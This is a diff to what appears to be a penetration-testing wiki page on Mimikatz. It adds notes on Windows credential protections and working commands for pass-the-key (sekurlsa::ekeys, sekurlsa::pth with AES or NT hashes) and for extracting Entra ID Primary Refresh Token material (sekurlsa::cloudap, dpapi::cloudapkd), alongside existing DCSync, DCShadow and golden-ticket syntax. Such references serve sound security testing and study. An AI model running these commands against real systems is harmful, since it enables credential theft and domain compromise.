@@ -17,6 +17,8 @@ From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have b
 
 Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
 
+On modern workstations this matters even more because **Credential Guard is enabled by default on many Windows 11 22H2+ and Windows Server 2025 domain-joined, non-DC systems**, while **LSASS-as-PPL is enabled by default on fresh Windows 11 22H2+ installs**. In practice, this means `sekurlsa::logonpasswords` often yields less material than older tradecraft expected and operators increasingly pivot to **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, or **CloudAP/PRT-oriented modules**. For the protection side, check [Windows credentials protections](credentials-protections.md).
+
 ### Counteracting SeDebugPrivilege Removal
 
 Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
@@ -53,6 +55,8 @@ Event log tampering in Mimikatz involves two primary actions: clearing event log
 - The `event::drop` command then patches the Event Logging service.
 
 ### Kerberos Ticket Attacks
+
+Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.
 
 ### Golden Ticket Creation
 
@@ -127,13 +131,25 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
   - Clears all Kerberos tickets from the session.
   - Useful before using ticket manipulation commands to avoid conflicts.
 
+### Over-Pass-the-Hash / Pass-the-Key
+
+If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.
+
+```bash
+mimikatz "privilege::debug" "sekurlsa::ekeys" exit
+mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
+mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
+```
+
+`/impersonate` reuses the current process instead of spawning a new console, which is handy when you want to immediately run things like `lsadump::dcsync` in the same context.
+
 ### Active Directory Tampering
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation. See [DCShadow](../active-directory-methodology/dcshadow.md).
 
   - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data.
+- **DCSync**: Mimic a DC to request password data. See [DCSync](../active-directory-methodology/dcsync.md).
   - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
 ### Credential Access
@@ -160,6 +176,18 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **LSADUMP::Trust**: Retrieve trust authentication information.
   - `mimikatz "lsadump::trust" exit`
+
+### Cloud credentials / Entra ID
+
+On **Entra ID** or **hybrid-joined** hosts, `sekurlsa::cloudap` can expose cached **Primary Refresh Token (PRT)** material from LSASS. If the associated Proof-of-Possession key is software-protected, `dpapi::cloudapkd` can derive the clear/derived key material needed for follow-on **Pass-the-PRT** workflows.
+
+```bash
+mimikatz "privilege::debug" "sekurlsa::cloudap" exit
+mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
+mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
+```
+
+This becomes much harder when the key is TPM-backed, but it is worth checking on hybrid endpoints because the cached CloudAP data may be more interesting than classic `wdigest` output. For the cloud-side abuse chain, see [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
 
 ### Miscellaneous
 
@@ -208,6 +236,11 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Extract passwords from Windows Vault.
   - `mimikatz "vault::cred /patch" exit`
 
+
+## References
+
+- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
+- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
 
 {{#include ../../banners/hacktricks-training.md}}
 
